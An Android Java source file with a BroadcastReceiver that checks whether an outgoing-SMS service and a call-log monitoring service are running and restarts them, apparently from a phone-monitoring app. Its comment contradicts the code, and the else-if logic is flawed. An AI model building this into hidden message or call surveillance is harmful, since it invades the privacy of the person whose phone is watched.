package com.bigeye.crasher;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class StartServiceReceiver extends BroadcastReceiver {

	/*
	 * PURPOSE
	 	* Check whether outgoingSMSService & MonitorCallLogsService are running
	 	* If the 2 services are running they wont be restarted
	 	* If any of the services are not running, they wont be started  
	 */
	
	public Context context;
	private String OUTGOING_SVC_NAME=OutgoingSMSService.class.getName();
	private String CALLLOG_SVC_NAME = MonitorCallLogsService.class.getName();
	private String APP_TAG ="StartServiceReceiver";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		this.context = context;
		Intent service = new Intent(context,OutgoingSMSService.class);
		Intent LogService = new Intent(context,MonitorCallLogsService.class);
		
		if (!isServiceRunning(OUTGOING_SVC_NAME)) {
			context.startService(service);
		}else if(!isServiceRunning(CALLLOG_SVC_NAME)){
			context.startService(LogService);
		}else{
			return;
		}
	}
	
	public boolean isServiceRunning(String SVC_NAME){
		ActivityManager manager = (ActivityManager)context.getSystemService(context.ACTIVITY_SERVICE);
		for(RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)){
			if(SVC_NAME.equals(service.service.getClassName())){
				Log.i(APP_TAG,SVC_NAME+" already running!");
				return true;
			}
		}
		Log.i(APP_TAG,SVC_NAME+" not running!");
		return false;
	}
}
